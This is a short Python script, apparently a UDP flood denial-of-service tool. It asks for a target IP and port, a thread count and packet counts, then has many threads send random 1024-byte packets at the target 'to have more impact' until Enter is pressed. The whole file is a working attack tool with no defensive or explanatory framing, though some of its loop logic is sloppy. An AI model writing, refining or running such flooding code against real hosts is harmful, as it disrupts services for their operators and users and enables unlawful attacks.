import random
import socket
import threading
import keyboard

ip = str(input(" IP: "))
port = int(input(" PORT: "))
times = int(input(" PACKETS PER THREAD: "))
threads = int(input(" THREADS: "))
loopOfLoop = int(input(" LOOPS OF LOOPS (restarting attack to have more impact): "))
def main():
	for y in range(threads):
		th = threading.Thread(target=go2)
		th.start()
def go():
	sum = 0
	loop = 0
	data = random._urandom(1024)
	while loop<loopOfLoop:
		loop+=loop+1
		try:
			if keyboard.is_pressed('\r'):
				try:
					break
				except:
					print(" 'Enter' detected, stopping...")
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				sum+= 1
			print(sum, " Sending ")
		except:
			print(" Not Sending ")
def go2():
	while 1:
		if keyboard.is_pressed('\r'):
			try:
				break
			except:
				print(" 'Enter' detected, stopping...")
		go()
main()